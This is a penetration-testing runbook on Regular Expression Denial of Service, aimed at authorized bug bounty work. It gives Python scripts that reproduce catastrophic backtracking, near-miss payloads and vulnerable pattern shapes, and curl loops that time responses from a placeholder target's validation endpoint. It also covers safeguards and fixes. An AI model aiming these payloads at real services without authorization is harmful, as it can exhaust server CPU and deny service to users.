---
title: "Regular Expression Denial of Service (ReDoS)"
description: "Finding and proving catastrophic backtracking in user-supplied regex paths to exhaust server CPU with a single crafted input."
phase: Web
order: 67
tags:
  - redos
  - dos
  - regex
  - availability
tools:
  - python3
  - regex101
  - curl
updated: 2026-10-01
---

A ReDoS runbook for bug bounty / authorized pentest on **in-scope** targets only. Goal: locate a user-reachable regular expression with catastrophic backtracking, build a near-miss payload, and measure exponential response-time growth without sustaining a DoS.

## 1. Model the vulnerable pattern locally

Reproduce the suspect regex in Python to reason about its behavior before touching the target.

```bash
python3 - <<'PY'
import re, time
pat = re.compile(r'^(a+)+$')          # nested quantifier = classic ReDoS
for n in (18, 22, 26, 30):
    s = "a" * n + "!"
    t = time.perf_counter()
    pat.match(s)
    print(f"len={n:>3}  {time.perf_counter()-t:.4f}s")
PY
```

Linear growth is safe; each step roughly doubling (or worse) indicates backtracking. Paste the pattern into `regex101.com` with a failing string to visualize the backtrack count.

## 2. Locate the regex on the target

Find inputs that are validated, masked, or rewritten server-side: email/phone/URL validators, search filters, routing rules, WAF rules, templates.

```bash
# Probe candidate fields that trigger regex validation
for v in 'a@b.com' 'aaaa@bbbb.com' 'a!'; do
  curl -s -o /dev/null -w "$v -> %{http_code} %{time_total}s\n" \
    "https://target.com/api/validate?email=$v"
done
```

Watch for fields whose response time scales with input length.

## 3. Build a near-miss payload

The engine blows up only on input that *almost* matches then fails at the end.

```python
# Long run of the repeating token, then a character that breaks the match
payload = "a" * 30 + "!"
```

For other shapes: `(a|a)*`, `(.*a){n}`, `(\w+\s?)*`, `([a-zA-Z]+)*` — drive each with a long matching prefix and a failing suffix.

## 4. Measure scaling on the target

Increase length gradually and compare response times. Stop before the server degrades.

```bash
for n in 18 22 26 28; do
  p=$(python3 -c "print('a'*$n + '!')")
  curl -s -o /dev/null -w "len=$n  %{time_total}s\n" \
    --max-time 10 \
    "https://target.com/api/validate?email=$p"
done
```

A jump from milliseconds to seconds between lengths confirms the flaw.

## 5. Confirm engine behavior safely

- The same pattern behaves differently in PCRE, JavaScript, Java, and .NET — reproduce locally with the target's likely engine.
- Cap your probes with `--max-time` and never send sustained load.
- Prove the exponential curve with a handful of samples, then stop.

## Full pipeline

```bash
cat > /tmp/redos.py <<'PY'
import re, time, sys
pat = re.compile(sys.argv[1])
token = sys.argv[2] if len(sys.argv) > 2 else "a"
for n in (18, 22, 26, 30):
    s = token * n + "!"
    t = time.perf_counter()
    pat.match(s)
    print(f"len={n:>3}  {time.perf_counter()-t:.4f}s")
PY

# 1. Model the pattern locally
python3 /tmp/redos.py '^(a+)+$'

# 2. Locate the field on the target and measure scaling
for n in 18 22 26 28; do
  p=$(python3 -c "print('a'*$n + '!')")
  curl -s -o /dev/null -w "len=$n  %{time_total}s\n" \
    --max-time 10 "https://target.com/api/validate?email=$p"
done
```

## Ethics & legality

- ReDoS is a denial-of-service class: never send sustained or high-volume payloads.
- Use short, limited probes with client timeouts and stop at the first clear delay.
- Only test endpoints in scope and never aim at shared infrastructure that affects others.
- Recommend anchoring patterns, atomic/possessive quantifiers, input length caps, or a linear-time engine (RE2) in the report.
